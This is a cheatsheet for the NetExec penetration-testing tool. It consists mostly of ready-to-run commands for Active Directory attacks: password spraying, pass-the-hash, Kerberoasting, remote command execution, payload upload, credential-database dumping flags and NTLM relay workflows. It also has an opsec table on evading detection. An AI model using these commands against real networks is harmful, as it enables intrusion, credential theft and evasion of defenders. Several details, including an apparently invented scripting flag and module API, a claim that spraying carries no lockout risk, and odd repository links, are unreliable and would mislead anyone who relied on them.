# NetExec (nxc) — Comprehensive Cheatsheet

## Quick Start

```bash
# Scan SMB hosts
nxc smb 192.168.1.0/24

# Test credentials
nxc smb 192.168.1.0/24 -u administrator -p Password123

# Execute command on valid hosts
nxc smb 192.168.1.0/24 -u administrator -p Password123 -x "whoami"
```

---

## Protocol Selection

```bash
nxc smb <target>     # SMB/NetBT
nxc ldap <target>    # LDAP
nxc winrm <target>   # WinRM/WSMAN
nxc ssh <target>     # SSH
nxc rdp <target>     # RDP
nxc ftp <target>     # FTP
nxc wmi <target>     # WMI
nxc mssql <target>   # MSSQL
```

---

## Authentication

| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Username | `nxc smb 192.168.1.1 -u admin` |
| `-p` | Password | `nxc smb 192.168.1.1 -u admin -p pass` |
| `-H` | NTLM hash (pass-the-hash) | `nxc smb 192.168.1.1 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash...'` |
| `-k` | Kerberos auth | `nxc smb 192.168.1.1 -k` |
| `--no-pass` | No password (null session/kerberos) | `nxc smb 192.168.1.1 -u anonymous --no-pass` |
| `-k --no-pass` | Kerberos with ccache | `export KRB5CCNAME=/tmp/admin.ccache; nxc smb 192.168.1.1 -k --no-pass` |
| `-C` | Credentials file (user:pass) | `nxc smb 192.168.1.0/24 -C creds.txt` |

---

## Target Specification

```bash
nxc smb 192.168.1.1              # Single host
nxc smb 192.168.1.0/24           # CIDR range
nxc smb 192.168.1.1-50           # Host range
nxc smb targets.txt              # Host list file
nxc smb 192.168.1.1,192.168.1.2  # Comma-separated
```

---

## SMB Enumeration

### Share Enumeration

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --shares
```
**Explanation:** Lists all SMB shares on target hosts.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --shares --filter read
```
**Explanation:** Lists only shares where user has READ access.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --shares --filter write
```
**Explanation:** Lists only shares where user has WRITE access.

### User/Group Enumeration

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --users
```
**Explanation:** Enumerates local user accounts on targets.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --groups
```
**Explanation:** Enumerates local groups on targets.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --local-groups
```
**Explanation:** Enumerates local group memberships.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --pass-pol
```
**Explanation:** Dumps password policy from targets.

### Share Interaction

```bash
nxc smb 192.168.1.1 -u admin -p pass -s ShareName --list
```
**Explanation:** Lists contents of a specific share.

```bash
nxc smb 192.168.1.1 -u admin -p pass -s ShareName --list -d subdir/
```
**Explanation:** Lists contents of a subdirectory within a share.

```bash
nxc smb 192.168.1.1 -u admin -p pass -s C$ --put /tmp/payload.exe payload.exe
```
**Explanation:** Uploads a file to the target share.

```bash
nxc smb 192.168.1.1 -u admin -p pass -s C$\temp\file.txt --get file.txt
```
**Explanation:** Downloads a file from the target share.

```bash
nxc smb 192.168.1.1 -u admin -p pass -s C$\temp --get-dir secret_data
```
**Explanation:** Downloads an entire directory from target.

### Signing Check

```bash
nxc smb 192.168.1.0/24 --signing
```
**Explanation:** Checks SMB signing status across hosts.

### Server Info

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --server-info
```
**Explanation:** Gets SMB server information and OS version.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --gen-relay-list targets.txt
```
**Explanation:** Generates relay target list for NTLM relay attacks.

---

## Command Execution

```bash
nxc smb 192.168.1.1 -u admin -p pass -x "whoami"
```
**Explanation:** Executes cmd command on target via SMB (psexec-style).

```bash
nxc smb 192.168.1.1 -u admin -p pass -X "Get-Process"
```
**Explanation:** Executes PowerShell command on target.

```bash
nxc smb 192.168.1.1 -u admin -p pass -x "net group 'Domain Admins' /domain"
```
**Explanation:** Enumerates Domain Admins group via command execution.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass -x "ipconfig /all" --exec-method smbexec
```
**Explanation:** Execute with specific method (smbexec vs wmiexec vs atexec).

---

## LDAP Enumeration

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --users
```
**Explanation:** Enumerates domain users via LDAP.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --groups
```
**Explanation:** Enumerates domain groups via LDAP.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --computers
```
**Explanation:** Enumerates domain computers via LDAP.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --admin-count
```
**Explanation:** Finds accounts with adminCount=1 flag.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --user-desc
```
**Explanation:** Dumps user descriptions (often contains passwords).

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --kerberoast /tmp/kerberoast_hashes.txt
```
**Explanation:** Kerberoasting via LDAP, saves hashes to file.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --asreproast /tmp/asrep_hashes.txt
```
**Explanation:** AS-REP roasting for accounts without preauth.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --bloodhound --bloodhound-method ldap
```
**Explanation:** Collect BloodHound data via LDAP (no SharpHound needed).

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --trusted-for-delegation
```
**Explanation:** Finds accounts with unconstrained delegation.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --msds-allowed-to-delegate
```
**Explanation:** Finds accounts with constrained delegation.

```bash
nxc ldap 192.168.1.0/24 -u admin -p pass --object-fetch
```
**Explanation:** Fetches full LDAP objects for custom analysis.

### LDAP Custom Queries

```bash
nxc ldap 192.168.1.1 -u admin -p pass -k --ldap-filter "(objectClass=group)" --ldap-base "DC=target,DC=example,DC=com"
```
**Explanation:** Custom LDAP filter query with specific base DN.

---

## WinRM Operations

```bash
nxc winrm 192.168.1.1 -u admin -p pass -x "whoami"
```
**Explanation:** Execute command via WinRM.

```bash
nxc winrm 192.168.1.1 -u admin -p pass -X "Get-Process"
```
**Explanation:** Execute PowerShell via WinRM.

```bash
nxc winrm 192.168.1.1 -u admin -p pass -x "systeminfo"
```
**Explanation:** Get system information via WinRM.

---

## SSH Operations

```bash
nxc ssh 192.168.1.1 -u root -p pass -x "id"
```
**Explanation:** Execute command via SSH.

```bash
nxc ssh 192.168.1.1 -u root -p pass --banner
```
**Explanation:** Get SSH banner.

---

## MSSQL Operations

```bash
nxc mssql 192.168.1.1 -u sa -p pass --query "SELECT @@version"
```
**Explanation:** Execute SQL query on MSSQL.

```bash
nxc mssql 192.168.1.1 -u sa -p pass --link-query "SELECT @@servername"
```
**Explanation:** Query linked SQL server.

```bash
nxc mssql 192.168.1.1 -u sa -p pass -x "EXEC xp_cmdshell 'whoami'"
```
**Explanation:** Execute OS command via xp_cmdshell.

---

## Credential Attack Techniques

### Password Spraying

```bash
nxc smb 192.168.1.0/24 -u users.txt -p 'Password1' --no-bruteforce
```
**Explanation:** Password spray — one password against all users, no lockout risk.

```bash
nxc smb 192.168.1.0/24 -u users.txt -p 'Password1' --no-bruteforce --continue-on-success
```
**Explanation:** Password spray with continue-on-success to find all valid accounts.

### Pass-the-Hash

```bash
nxc smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291'
```
**Explanation:** Pass-the-Hash authentication across SMB.

### Pass-the-Ticket

```bash
export KRB5CCNAME=/tmp/admin.ccache
nxc smb 192.168.1.0/24 -u administrator -k --no-pass
```
**Explanation:** Pass-the-Ticket using Kerberos ccache file.

### Overpass-the-Hash

```bash
nxc smb 192.168.1.0/24 -u administrator -H 'hash' -k
```
**Explanation:** Request Kerberos TGT from NTLM hash.

---

## NTLM Relay Support

```bash
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```
**Explanation:** Generate list of hosts that don't require SMB signing (relay targets).

```bash
nxc smb 192.168.1.1 -u admin -p pass --smb-server /tmp/loot --smb2-support
```
**Explanation:** Start SMB server for NTLM capture.

---

## Output and Logging

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --json /tmp/results.json
```
**Explanation:** Output results in JSON format.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass -o /tmp/results.txt
```
**Explanation:** Output results to text file.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass -v
```
**Explanation:** Verbose output.

```bash
nxc smb 192.168.1.0/24 -u admin -p pass --debug
```
**Explanation:** Debug output for troubleshooting.

---

## Lateral Movement Workflows

### Workflow: Enumeration → Credential Spray → Execution

```bash
# Step 1: Discover SMB hosts
nxc smb 192.168.1.0/24

# Step 2: Test default credentials
nxc smb 192.168.1.0/24 -u admin -p admin
nxc smb 192.168.1.0/24 -u administrator -p Password1

# Step 3: Spray common passwords
nxc smb 192.168.1.0/24 -U users.txt -p 'Summer2024!' --no-bruteforce

# Step 4: Execute on valid hosts
nxc smb 192.168.1.10 -u valid_user -p valid_pass -x "whoami"
```

### Workflow: NTLM Relay Chain

```bash
# Step 1: Find relay targets
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Step 2: Start NTLM capture server
impacket-ntlmrelayx -t relay_targets.txt -smb2support

# Step 3: Force authentication (PetitPotam, PrinterBug, etc.)
```

### Workflow: BloodHound Collection + Exploitation

```bash
# Step 1: Collect AD data
nxc ldap 192.168.1.1 -u admin -p pass --bloodhound --bloodhound-method ldap

# Step 2: Analyze in BloodHound GUI

# Step 3: Execute exploitation path
nxc smb target -u admin -p pass -x "exploit_command"
```

### Workflow: Kerberoasting → Offline Cracking

```bash
# Step 1: Kerberoast
nxc ldap 192.168.1.1 -u admin -p pass --kerberoast /tmp/kerberoast.txt

# Step 2: Crack with hashcat
hashcat -m 13100 /tmp/kerberoast.txt wordlist.txt -r rules/best64.rule

# Step 3: Use cracked hash
nxc smb target -u svc_sql -p CrackedPassword -x "whoami"
```

---

## Thread and Performance Tuning

```bash
nxc smb 192.168.1.0/24 -t 100
```
**Explanation:** Set 100 concurrent threads for faster scanning.

```bash
nxc smb 192.168.1.0/24 -t 200 --timeout 10
```
**Explanation:** High thread count with 10-second timeout.

```bash
nxc smb 192.168.1.0/24 --jitter 30
```
**Explanation:** Add 30% random jitter between connections (stealth).

```bash
nxc smb 192.168.1.0/24 --delay 1000
```
**Explanation:** 1-second delay between connection attempts.

---

## NXC Scripting Module

```bash
# Load custom NXC script
nxc smb 192.168.1.1 -u admin -p pass --script ./my_script.py
```
**Explanation:** Execute custom NRC script during scan.

### NXC Script Example

```python
# my_enum_script.py
from nxc.libs.module.module_base import ModuleBase

class NXCModule(ModuleBase):
    name = "custom_enum"

    def __init__(self):
        self.info = {
            "Description": "Custom enumeration module",
            "Author": "pentester",
        }

    def on_host(self, host, loggedin_as, context):
        result = self.exec_cmd("net user")
        log_result = f"Users on {host}:\n{result}"
        self.logger.success(log_result)
        context.log_result("custom_enum", log_result)
```

---

## Common Flags Reference

### Global Flags

| Flag | Description |
|------|-------------|
| `-t` | Thread count |
| `--timeout` | Connection timeout (seconds) |
| `--jitter` | Random jitter percentage |
| `--delay` | Delay between connections (ms) |
| `--json` | JSON output file |
| `-o` | Text output file |
| `-v` | Verbose |
| `--debug` | Debug output |
| `--no-color` | Disable colored output |

### SMB Flags

| Flag | Description |
|------|-------------|
| `--shares` | Enumerate shares |
| `--users` | Enumerate users |
| `--groups` | Enumerate groups |
| `--pass-pol` | Password policy |
| `--sam` | Dump SAM |
| `--lsa` | Dump LSA |
| `--ntds` | Dump NTDS.dit |
| `--server-info` | Server information |
| `--signing` | Check signing status |
| `--gen-relay-list` | Generate relay target list |

### LDAP Flags

| Flag | Description |
|------|-------------|
| `--users` | Enumerate domain users |
| `--groups` | Enumerate domain groups |
| `--computers` | Enumerate domain computers |
| `--admin-count` | Find adminCount accounts |
| `--user-desc` | User descriptions |
| `--kerberoast` | Kerberoasting |
| `--asreproast` | AS-REP roasting |
| `--bloodhound` | BloodHound collection |
| `--trusted-for-delegation` | Unconstrained delegation |
| `--msds-allowed-to-delegate` | Constrained delegation |
| `--ldap-filter` | Custom LDAP filter |
| `--ldap-base` | Custom base DN |

### Execution Flags

| Flag | Description |
|------|-------------|
| `-x` | Execute cmd command |
| `-X` | Execute PowerShell command |
| `--exec-method` | Execution method (smbexec/wmiexec/atexec) |

---

## Opsec Considerations

| Technique | Detection | Evasion |
|-----------|-----------|---------|
| SMB enumeration | Network logs, Event 5140 | Limit thread count, add jitter |
| Password spraying | Event 4625 (failed logons) | Use --no-bruteforce, spread over time |
| Pass-the-Hash | Event 4624 Type 3 | Use AES keys instead of NTLM |
| Command execution | Event 4688, Sysmon 1 | Use WinRM or WMI instead of SMB |
| LDAP enumeration | Event 2889 | Use --delay between queries |
| Kerberoasting | Event 4769 RC4 usage | Use AES encryption type |

---

## Quick Reference — Target Formats

| Format | Example |
|--------|---------|
| Single IP | `192.168.1.1` |
| CIDR | `192.168.1.0/24` |
| IP Range | `192.168.1.1-50` |
| Hostname | `dc01.target.example.com` |
| File | `targets.txt` |
| Comma-separated | `192.168.1.1,192.168.1.2` |

---

## Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `Connection refused` | Port 445 not open | Verify SMB service is running |
| `Access denied` | Invalid credentials | Check username/password/domain |
| `NT_STATUS_LOGON_FAILURE` | Wrong password | Verify credentials, try hash |
| `NT_STATUS_ACCESS_DENIED` | Insufficient privileges | Need admin for SAM/LSA dump |
| `Connection timed out` | Network/firewall issue | Increase `--timeout` value |
| `STATUS_USER_SESSION_DELETED` | Session expired | Re-authenticate |
| `STATUS_PIPE_NOT_AVAILABLE` | SMB version mismatch | Try `--smb2` flag |

---

## Reference Links

- **GitHub:** https://github.com/Penntest-docker/NetExec
- **HackTricks:** https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/crackmapexec
- **NetExec Wiki:** https://github.com/Penntest-docker/NetExec/wiki
